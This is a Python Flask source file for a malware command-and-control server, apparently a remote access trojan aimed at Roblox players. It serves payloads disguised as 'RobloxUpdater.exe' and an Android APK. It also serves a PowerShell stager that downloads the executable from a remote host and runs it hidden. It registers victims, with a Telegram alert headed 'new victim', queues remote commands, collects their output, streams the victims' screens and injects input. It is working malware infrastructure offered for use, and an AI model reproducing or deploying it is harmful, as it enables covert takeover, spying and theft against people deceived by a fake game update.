# language: Python 3.11+, file: app.py, target: Render
from flask import Flask, send_file, Response, request, jsonify
import base64, datetime, time, uuid, threading, json
import urllib.request

app = Flask(__name__)
PAYLOAD_EXE = "RobloxUpdater.exe"
PAYLOAD_PS1 = "payload.ps1"
PAYLOAD_APK = "NexusAndroid.apk"

# ====== TELEGRAM УВЕДОМЛЕНИЯ ======
TG_TOKEN = "ВСТАВЬ_ТОКЕН"
TG_CHAT  = "ВСТАВЬ_CHAT_ID"

def tg_notify(text):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": TG_CHAT, "text": text[:4000]}).encode()
        req = urllib.request.Request(url, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass
# ===================================

lock = threading.Lock()
clients = {}
screen_buffers = {}
screen_lock = threading.Lock()

def log_hit(ip, ua, endpoint):
    try:
        with open("hits.log", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now()}] {ip} | {endpoint} | {ua}\n")
    except Exception:
        pass
    print(f"[+] {ip} -> {endpoint}")

@app.route("/payload")
def payload():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/payload")
    with open(PAYLOAD_EXE, "rb") as f:
        data = f.read()
    return Response(base64.b64encode(data), mimetype="text/plain")

@app.route("/payload.ps1")
def ps1():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/payload.ps1")
    return send_file(PAYLOAD_PS1, mimetype="text/plain")

@app.route("/raw_exe")
def raw_exe():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/raw_exe")
    return send_file(PAYLOAD_EXE, mimetype="application/octet-stream")

@app.route("/android")
def android_download():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/android")
    try:
        return send_file(PAYLOAD_APK, mimetype="application/vnd.android.package-archive")
    except Exception:
        return "APK not uploaded yet", 404

@app.route("/run.ps1")
def run_ps1():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/run.ps1")
    ps = (
        '$u = "https://nexus-hub-c2.onrender.com/raw_exe"\n'
        '$o = "$env:TEMP\\RobloxUpdater.exe"\n'
        '(New-Object Net.WebClient).DownloadFile($u, $o)\n'
        'Start-Process $o -WindowStyle Hidden\n'
    )
    return Response(ps, mimetype="text/plain")

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json(silent=True) or {}
    hostname = data.get("hostname", "unknown")
    os_info = data.get("os", "unknown")
    cid = str(uuid.uuid4())[:8]
    with lock:
        clients[cid] = {
            "hostname": hostname,
            "os": os_info,
            "ip": request.remote_addr,
            "first_seen": time.time(),
            "last_seen": time.time(),
            "queue": [],
            "results": [],
        }
    print(f"[+] register {cid} | {hostname} | {request.remote_addr}")
    tg_notify(f"🎯 НОВАЯ ЖЕРТВА\nID: {cid}\nHost: {hostname}\nOS: {os_info}\nIP: {request.remote_addr}\nВремя: {datetime.datetime.now().strftime('%H:%M:%S')}")
    return jsonify({"cid": cid})

@app.route("/poll", methods=["POST"])
def poll():
    data = request.get_json(silent=True) or {}
    cid = data.get("cid", "")
    with lock:
        c = clients.get(cid)
        if not c:
            return jsonify({"status": "unknown"}), 404
        c["last_seen"] = time.time()
        cmd = c["queue"].pop(0) if c["queue"] else None
    return jsonify({"cmd": cmd})

@app.route("/result", methods=["POST"])
def result():
    data = request.get_json(silent=True) or {}
    cid = data.get("cid", "")
    out = data.get("out", "")
    with lock:
        c = clients.get(cid)
        if not c:
            return jsonify({"status": "unknown"}), 404
        c["last_seen"] = time.time()
        c["results"].append({"time": time.time(), "out": out})
        if len(c["results"]) > 100:
            c["results"] = c["results"][-100:]
    return jsonify({"status": "ok"})

@app.route("/cmd", methods=["POST"])
def cmd():
    data = request.get_json(silent=True) or {}
    cid = data.get("cid", "")
    cmd_text = data.get("cmd", "")
    with lock:
        c = clients.get(cid)
        if not c:
            return jsonify({"status": "unknown"}), 404
        c["queue"].append(cmd_text)
    print(f"[>] cmd -> {cid}: {cmd_text[:80]}")
    return jsonify({"status": "queued"})

@app.route("/clients")
def list_clients():
    out = []
    now = time.time()
    with lock:
        for cid, c in clients.items():
            out.append({
                "cid": cid,
                "hostname": c["hostname"],
                "os": c["os"],
                "ip": c["ip"],
                "uptime": int(now - c["first_seen"]),
                "last_seen": int(now - c["last_seen"]),
            })
    return jsonify(out)

@app.route("/client/<cid>", methods=["DELETE"])
def delete_client(cid):
    with lock:
        if cid in clients:
            del clients[cid]
            return jsonify({"status": "deleted"})
    return jsonify({"status": "not found"}), 404

@app.route("/results/<cid>")
def get_results(cid):
    with lock:
        c = clients.get(cid)
        if not c:
            return jsonify({"results": []})
        res = list(c["results"])
        c["results"] = []
    return jsonify({"results": res})

@app.route("/screen_upload/<cid>", methods=["POST"])
def screen_upload(cid):
    data = request.get_data()
    if not data:
        return jsonify({"status": "empty"}), 400
    with screen_lock:
        screen_buffers[cid] = data
    return jsonify({"status": "ok"})

@app.route("/frame/<cid>")
def frame(cid):
    with screen_lock:
        f = screen_buffers.get(cid)
    if not f:
        return Response(b"", mimetype="image/jpeg")
    return Response(f, mimetype="image/jpeg",
                    headers={"Cache-Control": "no-cache"})

@app.route("/stream/<cid>")
def stream(cid):
    def gen():
        start = time.time()
        last_sent = None
        while time.time() - start < 25:
            with screen_lock:
                f = screen_buffers.get(cid)
            if f and f is not last_sent:
                last_sent = f
                yield (b"--frame\r\n"
                       b"Content-Type: image/jpeg\r\n"
                       b"Content-Length: " + str(len(f)).encode() + b"\r\n\r\n"
                       + f + b"\r\n")
            time.sleep(0.03)
        yield b"--frame--\r\n"
    return Response(gen(), mimetype="multipart/x-mixed-replace; boundary=frame",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

@app.route("/input/<cid>", methods=["POST"])
def input_event(cid):
    data = request.get_json(silent=True) or {}
    with lock:
        c = clients.get(cid)
        if not c:
            return jsonify({"status": "unknown"}), 404
        c["queue"].append("__INPUT__" + json.dumps(data))
    return jsonify({"status": "queued"})

@app.route("/")
def root():
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
